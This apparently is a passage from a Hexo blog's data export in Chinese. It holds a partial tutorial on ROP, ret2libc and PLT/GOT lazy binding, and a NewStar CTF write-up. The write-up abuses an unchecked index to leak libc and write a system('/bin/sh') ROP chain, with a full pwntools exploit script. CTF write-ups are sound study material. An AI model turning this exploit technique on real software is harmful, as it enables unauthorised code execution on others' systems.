SROP\n","slug":"ROP","published":1,"updated":"2023-01-03T14:59:42.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czafk00215oud96yh586j","content":"<p>ROP是面向返回的编程，通过一个个gadget来进行编程，<strong>改变寄存器以及变量的值</strong>，每一个gadget在执行了其指令后会通过<strong>ret</strong>返回到下一个gadget，从而达到控制程序执行流的目的。</p>\n<span id=\"more\"></span>\n<h2 id=\"ret2libc\"><a href=\"#ret2libc\" class=\"headerlink\" title=\"ret2libc\"></a>ret2libc</h2><p>当有NX保护，无法执行shellcode，也无syscall和后门函数的话，通过ret2libc也可以达成get shell的目的。</p>\n<p>绝大部分程序运行前都会链接到<strong>libc库</strong>，并调用库中的函数实现功能，比如write、read、puts、system等函数就是这个库中的函数。ret2libc主要是利用libc中的函数达到get shell的目的，虽然程序中没有利用到system函数和”/bin/sh”，但在程序的libc中，这些内容都是<strong>存在</strong>的，只要能找到他们的地址，并能控制程序的执行流执行他们，就可以达到get shell的目的。</p>\n<p>system和”/bin/sh”的地址可以通过在程序中出现的libc库函数的地址得到。在一个版本的libc中，各个函数的位置是固定的，也就是说，<strong>函数和libc基地址之间的偏移是固定的</strong>，因此，通过pwntools的ELF模块解析了libc之后，就可以得到各个函数的偏移，通过已知函数的地址，就能知道system函数和”/bin/sh”的地址。</p>\n<h3 id=\"延迟绑定机制-lazy-binding\"><a href=\"#延迟绑定机制-lazy-binding\" class=\"headerlink\" title=\"延迟绑定机制(lazy binding)\"></a>延迟绑定机制(lazy binding)</h3><p>为了减少程序编译花费的时间，会采用<strong>动态链接</strong>的技术，在编译过程中，用<strong>偏移</strong>去表示函数的位置，<strong>在程序运行时才将该函数的真实地址得出写入</strong>，其中的延迟绑定机制是在<strong>函数第一次运行时才将该函数的真实地址得出写入</strong>。</p>\n<p>为了实现延迟绑定，编译时需要用到PLT和GOT进行辅助。GOT是全局偏移表，包括了.got表和.got.plt表，**.got表记录全局变量的地址，.got.plt表记录全局函数的地址<strong>，PLT是进程链接表，.plt记录了</strong>函数在GOT表中的位置和调用解析函数的代码**，保存在代码段中，在进程加载和运行的时候都不会改变。</p>\n<p>在程序中，call调用的是实际上是函数在.plt表中的内容。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">call xxx@plt</span><br><span class=\"line\">xxx@plt指向xxx函数在.plt表中的内容</span><br><span class=\"line\"></span><br><span class=\"line\">xxx@plt:</span><br><span class=\"line\">jump *(xxx@got) //跳转到xxx函数在.got.plt表中的内容</span><br><span class=\"line\">push index      //将一个数index入栈</span><br><span class=\"line\">jump got[0]     //跳转到.got表的第一项，也就是符号解析函数处</span><br></pre></td></tr></table></figure>\n\n<p>最开始时，xxx函数在 <strong>.got.plt表中的内容</strong> 是 <strong>xxx@plt+6，也就是push index的地址</strong>，并跳转到符号解析函数处进行解析，将xxx函数的<strong>真实地址</strong>（在.got表中的内容）<strong>写入</strong>xxx函数在.got.plt表中的位置，从第二次开始就可以直接跳转到真实的地址<strong>直接执行</strong>。</p>\n<p>下图可以看出plt和got表的关系</p>\n<p><img src=\"./ROP/plt_and_got.jpg\" alt=\"plt_and_got\"></p>\n<h3 id=\"对抗ASLR-PIE\"><a href=\"#对抗ASLR-PIE\" class=\"headerlink\" title=\"对抗ASLR/PIE\"></a>对抗ASLR/PIE</h3><p>在开启了ASLR和PIE之后，程序基地址和libc基地址都会<strong>随机化</strong>，因此对libc的泄露就不再显然。需要利用程序中的输出函数（如：write、puts）将程序中.plt表中</p>\n<h2 id=\"csu\"><a href=\"#csu\" class=\"headerlink\" title=\"csu\"></a>csu</h2><h2 id=\"BROP\"><a href=\"#BROP\" class=\"headerlink\" title=\"BROP\"></a>BROP</h2><h2 id=\"SROP\"><a href=\"#SROP\" class=\"headerlink\" title=\"SROP\"></a>SROP</h2>","site":{"data":{}},"excerpt":"<p>ROP是面向返回的编程，通过一个个gadget来进行编程，<strong>改变寄存器以及变量的值</strong>，每一个gadget在执行了其指令后会通过<strong>ret</strong>返回到下一个gadget，从而达到控制程序执行流的目的。</p>","more":"<h2 id=\"ret2libc\"><a href=\"#ret2libc\" class=\"headerlink\" title=\"ret2libc\"></a>ret2libc</h2><p>当有NX保护，无法执行shellcode，也无syscall和后门函数的话，通过ret2libc也可以达成get shell的目的。</p>\n<p>绝大部分程序运行前都会链接到<strong>libc库</strong>，并调用库中的函数实现功能，比如write、read、puts、system等函数就是这个库中的函数。ret2libc主要是利用libc中的函数达到get shell的目的，虽然程序中没有利用到system函数和”/bin/sh”，但在程序的libc中，这些内容都是<strong>存在</strong>的，只要能找到他们的地址，并能控制程序的执行流执行他们，就可以达到get shell的目的。</p>\n<p>system和”/bin/sh”的地址可以通过在程序中出现的libc库函数的地址得到。在一个版本的libc中，各个函数的位置是固定的，也就是说，<strong>函数和libc基地址之间的偏移是固定的</strong>，因此，通过pwntools的ELF模块解析了libc之后，就可以得到各个函数的偏移，通过已知函数的地址，就能知道system函数和”/bin/sh”的地址。</p>\n<h3 id=\"延迟绑定机制-lazy-binding\"><a href=\"#延迟绑定机制-lazy-binding\" class=\"headerlink\" title=\"延迟绑定机制(lazy binding)\"></a>延迟绑定机制(lazy binding)</h3><p>为了减少程序编译花费的时间，会采用<strong>动态链接</strong>的技术，在编译过程中，用<strong>偏移</strong>去表示函数的位置，<strong>在程序运行时才将该函数的真实地址得出写入</strong>，其中的延迟绑定机制是在<strong>函数第一次运行时才将该函数的真实地址得出写入</strong>。</p>\n<p>为了实现延迟绑定，编译时需要用到PLT和GOT进行辅助。GOT是全局偏移表，包括了.got表和.got.plt表，**.got表记录全局变量的地址，.got.plt表记录全局函数的地址<strong>，PLT是进程链接表，.plt记录了</strong>函数在GOT表中的位置和调用解析函数的代码**，保存在代码段中，在进程加载和运行的时候都不会改变。</p>\n<p>在程序中，call调用的是实际上是函数在.plt表中的内容。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">call xxx@plt</span><br><span class=\"line\">xxx@plt指向xxx函数在.plt表中的内容</span><br><span class=\"line\"></span><br><span class=\"line\">xxx@plt:</span><br><span class=\"line\">jump *(xxx@got) //跳转到xxx函数在.got.plt表中的内容</span><br><span class=\"line\">push index      //将一个数index入栈</span><br><span class=\"line\">jump got[0]     //跳转到.got表的第一项，也就是符号解析函数处</span><br></pre></td></tr></table></figure>\n\n<p>最开始时，xxx函数在 <strong>.got.plt表中的内容</strong> 是 <strong>xxx@plt+6，也就是push index的地址</strong>，并跳转到符号解析函数处进行解析，将xxx函数的<strong>真实地址</strong>（在.got表中的内容）<strong>写入</strong>xxx函数在.got.plt表中的位置，从第二次开始就可以直接跳转到真实的地址<strong>直接执行</strong>。</p>\n<p>下图可以看出plt和got表的关系</p>\n<p><img src=\"./ROP/plt_and_got.jpg\" alt=\"plt_and_got\"></p>\n<h3 id=\"对抗ASLR-PIE\"><a href=\"#对抗ASLR-PIE\" class=\"headerlink\" title=\"对抗ASLR/PIE\"></a>对抗ASLR/PIE</h3><p>在开启了ASLR和PIE之后，程序基地址和libc基地址都会<strong>随机化</strong>，因此对libc的泄露就不再显然。需要利用程序中的输出函数（如：write、puts）将程序中.plt表中</p>\n<h2 id=\"csu\"><a href=\"#csu\" class=\"headerlink\" title=\"csu\"></a>csu</h2><h2 id=\"BROP\"><a href=\"#BROP\" class=\"headerlink\" title=\"BROP\"></a>BROP</h2><h2 id=\"SROP\"><a href=\"#SROP\" class=\"headerlink\" title=\"SROP\"></a>SROP</h2>"},{"title":"Read&Write","date":"2023-01-02T11:54:26.000Z","_content":"\nNewStar，感觉是纯算偏移的题\n\n64位栈溢出（但不是通常的栈溢出），保护全开。\n\n<!-- more -->\n\n程序中有Read和Write两个功能，会对栈上的一个变量num(rbp-0x410)，进行读写，在汇编中可以看到每个idx对应4byte。\n\n```c\n.text:0000000000000A8D                 mov     eax, [rbp+num_to_write]\n.text:0000000000000A93                 mov     ecx, [rbp+idx]\n.text:0000000000000A99                 mov     edx, eax\n.text:0000000000000A9B                 mov     eax, ecx\n.text:0000000000000A9D                 mov     [rbp+rax*4+nums], edx\n```\n\n主要的漏洞在于没有对下标进行检查，相当于可以任意读和任意写。\n\n首先我们要先泄露libc地址，通过Read rip处的内容(num+0x420)，处理后可得到libcbase。\n\n```python\n#leak libc\nread_num(0x108)\nru('The num: ')\ndata1=eval(ru('\\n')[:-1])\nread_num(0x109)\nru('The num: ')\ndata2=eval(ru('\\n')[:-1])\n\nleak('data1',hex(data1))\nleak('data2',hex(data2))\nlibcbase=u64((p32(data1)+p16(data2)).ljust(8,'\\x00'))-0x221620#偏移是调试的时候算出来的\nleak('libcbase',hex(libcbase))\n```\n\nleak libcbase之后，我们就可以得到ret、pop_rdi、system和/bin/sh的地址。\n\n之后通过Write将地址写进去就可以了，只是处理输入有些麻烦。\n\n```python\n# get shell\n\n# ret\npayload1=u32(p64(ret_addr)[:4])\npayload2=u16(p64(ret_addr)[4:6])\nleak('payload1',hex(payload1))\nleak('payload2',hex(payload2))\nwrite_num(0x106,payload1)\nwrite_num(0x107,payload2)\n\n# rip\npayload1=u32(p64(pop_rdi)[:4])\npayload2=u16(p64(pop_rdi)[4:6])\nleak('payload1',hex(payload1))\nleak('payload2',hex(payload2))\nwrite_num(0x108,payload1)\nwrite_num(0x109,payload2)\n\n\n#binsh\npayload1=u32(p64(binsh_addr)[:4])\npayload2=u16(p64(binsh_addr)[4:6])\nleak('payload1',hex(payload1))\nleak('payload2',hex(payload2))\nwrite_num(0x10a,payload1)\nwrite_num(0x10b,payload2)\n\n#system\npayload1=u32(p64(sys_addr)[:4])\npayload2=u16(p64(sys_addr)[4:6])\nleak('payload1',hex(payload1))\nleak('payload2',hex(payload2))\nwrite_num(0x10c,payload1)\nwrite_num(0x10d,payload2)\n```\n\nexp:\n\n```python\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='pwn2'\nelf=ELF('./'+filename)\nlibc=ELF('./libc-2.31.so')\np=process('./'+filename)\n#p=remote('',)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n\ndef read_num(idx):\n  ru('> ')\n  sl('1')\n  ru('Idx:')\n  sl(str(idx))\n\ndef write_num(idx,num):\n  ru('> ')\n  sl('2')\n  ru('Idx:')\n  sl(str(idx))\n  ru('Num:')\n  sl(str(num))\n\n\n# leak libc\nread_num(0x108)\nru('The num: ')\ndata1=eval(ru('\\n')[:-1])\nread_num(0x109)\nru('The num: ')\ndata2=eval(ru('\\n')[:-1])\n\n# 0x7f2de618e000 0x7f576d980000\n# 0x7f2de63af620 0x7f576dba1620\n# offset=0x221620      0x221620 \n\nleak('data1',hex(data1))\nleak('data2',hex(data2))\nlibcbase=u64((p32(data1)+p16(data2)).ljust(8,'\\x00'))-0x221620\nleak('libcbase',hex(libcbase))\n\nsys_addr=libcbase+libc.sym['system']\nbinsh_addr=libcbase+0x00000000001b45bd\npop_rdi=libcbase+0x0000000000023b6a\nret_addr=libcbase+0x0000000000022679\nleak('system',hex(sys_addr))\nleak('binsh',hex(binsh_addr))\nleak('pop rdi',hex(pop_rdi))\nleak('ret',hex(ret_addr))\n\n# Overwrite\n\n# ret\npayload1=u32(p64(ret_addr)[:4])\npayload2=u16(p64(ret_addr)[4:6])\nleak('payload1',hex(payload1))\nleak('payload2',hex(payload2))\nwrite_num(0x106,payload1)\nwrite_num(0x107,payload2)\n\n# rip\npayload1=u32(p64(pop_rdi)[:4])\npayload2=u16(p64(pop_rdi)[4:6])\nleak('payload1',hex(payload1))\nleak('payload2',hex(payload2))\nwrite_num(0x108,payload1)\nwrite_num(0x109,payload2)\n\n#binsh\npayload1=u32(p64(binsh_addr)[:4])\npayload2=u16(p64(binsh_addr)[4:6])\nleak('payload1',hex(payload1))\nleak('payload2',hex(payload2))\nwrite_num(0x10a,payload1)\nwrite_num(0x10b,payload2)\n\n#system\npayload1=u32(p64(sys_addr)[:4])\npayload2=u16(p64(sys_addr)[4:6])\nleak('payload1',hex(payload1))\nleak('payload2',hex(payload2))\nwrite_num(0x10c,payload1)\nwrite_num(0x10d,payload2)\n\n# get shell\nru('> ')\n#debug('b main')\nsl('0')\n\nitr()\n```","source":"_posts/Read&Write.md","raw":"---\ntitle: Read&Write\ndate: 2023-01-02 19:54:26\ncategories: \n- pwn_wp\ntags: \n- pwn\n- index overflow\n\n---\n\nNewStar，感觉是纯算偏移的题\n\n64位栈溢出（但不是通常的栈溢出），保护全开。\n\n<!-- more -->\n\n程序中有Read和Write两个功能，会对栈上的一个变量num(rbp-0x410)，进行读写，在汇编中可以看到每个idx对应4byte。\n\n```c\n.text:0000000000000A8D                 mov     eax, [rbp+num_to_write]\n.text:0000000000000A93                 mov     ecx, [rbp+idx]\n.text:0000000000000A99                 mov     edx, eax\n.text:0000000000000A9B                 mov     eax, ecx\n.text:0000000000000A9D                 mov     [rbp+rax*4+nums], edx\n```\n\n主要的漏洞在于没有对下标进行检查，相当于可以任意读和任意写。\n\n首先我们要先泄露libc地址，通过Read rip处的内容(num+0x420)，处理后可得到libcbase。\n\n```python\n#leak libc\nread_num(0x108)\nru('The num: ')\ndata1=eval(ru('\\n')[:-1])\nread_num(0x109)\nru('The num: ')\ndata2=eval(ru('\\n')[:-1])\n\nleak('data1',hex(data1))\nleak('data2',hex(data2))\nlibcbase=u64((p32(data1)+p16(data2)).ljust(8,'\\x00'))-0x221620#偏移是调试的时候算出来的\nleak('libcbase',hex(libcbase))\n```\n\nleak libcbase之后，我们就可以得到ret、pop_rdi、system和/bin/sh的地址。\n\n之后通过Write将地址写进去就可以了，只是处理输入有些麻烦。\n\n```python\n# get shell\n\n# ret\npayload1=u32(p64(ret_addr)[:4])\npayload2=u16(p64(ret_addr)[4:6])\nleak('payload1',hex(payload1))\nleak('payload2',hex(payload2))\nwrite_num(0x106,payload1)\nwrite_num(0x107,payload2)\n\n# rip\npayload1=u32(p64(pop_rdi)[:4])\npayload2=u16(p64(pop_rdi)[4:6])\nleak('payload1',hex(payload1))\nleak('payload2',hex(payload2))\nwrite_num(0x108,payload1)\nwrite_num(0x109,payload2)\n\n\n#binsh\npayload1=u32(p64(binsh_addr)[:4])\npayload2=u16(p64(binsh_addr)[4:6])\nleak('payload1',hex(payload1))\nleak('payload2',hex(payload2))\nwrite_num(0x10a,payload1)\nwrite_num(0x10b,payload2)\n\n#system\npayload1=u32(p64(sys_addr)[:4])\npayload2=u16(p64(sys_addr)[4:6])\nleak('payload1',hex(payload1))\nleak('payload2',hex(payload2))\nwrite_num(0x10c,payload1)\nwrite_num(0x10d,payload2)\n```\n\nexp:\n\n```python\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='pwn2'\nelf=ELF('./'+filename)\nlibc=ELF('./libc-2.31.so')\np=process('./'+filename)\n#p=remote('',)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n\ndef read_num(idx):\n  ru('> ')\n  sl('1')\n  ru('Idx:')\n  sl(str(idx))\n\ndef write_num(idx,num):\n  ru('> ')\n  sl('2')\n  ru('Idx:')\n  sl(str(idx))\n  ru('Num:')\n  sl(str(num))\n\n\n# leak libc\nread_num(0x108)\nru('The num: ')\ndata1=eval(ru('\\n')[:-1])\nread_num(0x109)\nru('The num: ')\ndata2=eval(ru('\\n')[:-1])\n\n# 0x7f2de618e000 0x7f576d980000\n# 0x7f2de63af620 0x7f576dba1620\n# offset=0x221620      0x221620 \n\nleak('data1',hex(data1))\nleak('data2',hex(data2))\nlibcbase=u64((p32(data1)+p16(data2)).ljust(8,'\\x00'))-0x221620\nleak('libcbase',hex(libcbase))\n\nsys_addr=libcbase+libc.sym['system']\nbinsh_addr=libcbase+0x00000000001b45bd\npop_rdi=libcbase+0x0000000000023b6a\nret_addr=libcbase+0x0000000000022679\nleak('system',hex(sys_addr))\nleak('binsh',hex(binsh_addr))\nleak('pop rdi',hex(pop_rdi))\nleak('ret',hex(ret_addr))\n\n# Overwrite\n\n# ret\npayload1=u32(p64(ret_addr)[:4])\npayload2=u16(p64(ret_addr)[4:6])\nleak('payload1',hex(payload1))\nleak('payload2',hex(payload2))\nwrite_num(0x106,payload1)\nwrite_num(0x107,payload2)\n\n# rip\npayload1=u32(p64(pop_rdi)[:4])\npayload2=u16(p64(pop_rdi)[4:6])\nleak('payload1',hex(payload1))\nleak('payload2',hex(payload2))\nwrite_num(0x108,payload1)\nwrite_num(0x109,payload2)\n\n#binsh\npayload1=u32(p64(binsh_addr)[:4])\npayload2=u16(p64(binsh_addr)[4:6])\nleak('payload1',hex(payload1))\nleak('payload2',hex(payload2))\nwrite_num(0x10a,payload1)\nwrite_num(0x10b,payload2)\n\n#system\npayload1=u32(p64(sys_addr)[:4])\npayload2=u16(p64(sys_addr)[4:6])\nleak('payload1',hex(payload1))\nleak('payload2',hex(payload2))\nwrite_num(0x10c,payload1)\nwrite_num(0x10d,payload2)\n\n# get shell\nru('> ')\n#debug('b main')\nsl('0')\n\nitr()\n```","slug":"Read&Write","published":1,"updated":"2023-01-02T16:18:04.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czafl00245oudd7n557yt","content":"<p>NewStar，感觉是纯算偏移的题</p>\n<p>64位栈溢出（但不是通常的栈溢出），保护全开。</p>\n<span id=\"more\"></span>\n\n<p>程序中有Read和Write两个功能，会对栈上的一个变量num(rbp-0x410)，进行读写，在汇编中可以看到每个idx对应4byte。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:<span class=\"number\">0000000000000</span>A8D                 mov     eax, [rbp+num_to_write]</span><br><span class=\"line\">.text:<span class=\"number\">0000000000000</span>A93                 mov     ecx, [rbp+idx]</span><br><span class=\"line\">.text:<span class=\"number\">0000000000000</span>A99                 mov     edx, eax</span><br><span class=\"line\">.text:<span class=\"number\">0000000000000</span>A9B                 mov     eax, ecx</span><br><span class=\"line\">.text:<span class=\"number\">0000000000000</span>A9D                 mov     [rbp+rax*<span class=\"number\">4</span>+nums], edx</span><br></pre></td></tr></table></figure>\n\n<p>主要的漏洞在于没有对下标进行检查，相当于可以任意读和任意写。</p>\n<p>首先我们要先泄露libc地址，通过Read rip处的内容(num+0x420)，处理后可得到libcbase。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#leak libc</span></span><br><span class=\"line\">read_num(<span class=\"number\">0x108</span>)</span><br><span class=\"line\">ru(<span class=\"string\">&#x27;The num: &#x27;</span>)</span><br><span class=\"line\">data1=<span class=\"built_in\">eval</span>(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>])</span><br><span class=\"line\">read_num(<span class=\"number\">0x109</span>)</span><br><span class=\"line\">ru(<span class=\"string\">&#x27;The num: &#x27;</span>)</span><br><span class=\"line\">data2=<span class=\"built_in\">eval</span>(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">leak(<span class=\"string\">&#x27;data1&#x27;</span>,<span class=\"built_in\">hex</span>(data1))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;data2&#x27;</span>,<span class=\"built_in\">hex</span>(data2))</span><br><span class=\"line\">libcbase=u64((p32(data1)+p16(data2)).ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))-<span class=\"number\">0x221620</span><span class=\"comment\">#偏移是调试的时候算出来的</span></span><br><span class=\"line\">leak(<span class=\"string\">&#x27;libcbase&#x27;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br></pre></td></tr></table></figure>\n\n<p>leak libcbase之后，我们就可以得到ret、pop_rdi、system和/bin/sh的地址。</p>\n<p>之后通过Write将地址写进去就可以了，只是处理输入有些麻烦。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># get shell</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ret</span></span><br><span class=\"line\">payload1=u32(p64(ret_addr)[:<span class=\"number\">4</span>])</span><br><span class=\"line\">payload2=u16(p64(ret_addr)[<span class=\"number\">4</span>:<span class=\"number\">6</span>])</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;payload1&#x27;</span>,<span class=\"built_in\">hex</span>(payload1))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;payload2&#x27;</span>,<span class=\"built_in\">hex</span>(payload2))</span><br><span class=\"line\">write_num(<span class=\"number\">0x106</span>,payload1)</span><br><span class=\"line\">write_num(<span class=\"number\">0x107</span>,payload2)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># rip</span></span><br><span class=\"line\">payload1=u32(p64(pop_rdi)[:<span class=\"number\">4</span>])</span><br><span class=\"line\">payload2=u16(p64(pop_rdi)[<span class=\"number\">4</span>:<span class=\"number\">6</span>])</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;payload1&#x27;</span>,<span class=\"built_in\">hex</span>(payload1))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;payload2&#x27;</span>,<span class=\"built_in\">hex</span>(payload2))</span><br><span class=\"line\">write_num(<span class=\"number\">0x108</span>,payload1)</span><br><span class=\"line\">write_num(<span class=\"number\">0x109</span>,payload2)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#binsh</span></span><br><span class=\"line\">payload1=u32(p64(binsh_addr)[:<span class=\"number\">4</span>])</span><br><span class=\"line\">payload2=u16(p64(binsh_addr)[<span class=\"number\">4</span>:<span class=\"number\">6</span>])</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;payload1&#x27;</span>,<span class=\"built_in\">hex</span>(payload1))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;payload2&#x27;</span>,<span class=\"built_in\">hex</span>(payload2))</span><br><span class=\"line\">write_num(<span class=\"number\">0x10a</span>,payload1)</span><br><span class=\"line\">write_num(<span class=\"number\">0x10b</span>,payload2)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#system</span></span><br><span class=\"line\">payload1=u32(p64(sys_addr)[:<span class=\"number\">4</span>])</span><br><span class=\"line\">payload2=u16(p64(sys_addr)[<span class=\"number\">4</span>:<span class=\"number\">6</span>])</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;payload1&#x27;</span>,<span class=\"built_in\">hex</span>(payload1))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;payload2&#x27;</span>,<span class=\"built_in\">hex</span>(payload2))</span><br><span class=\"line\">write_num(<span class=\"number\">0x10c</span>,payload1)</span><br><span class=\"line\">write_num(<span class=\"number\">0x10d</span>,payload2)</span><br></pre></td></tr></table></figure>\n\n<p>exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;pwn2&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class=\"line\">p=process(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\">#p=remote(&#x27;&#x27;,)</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span 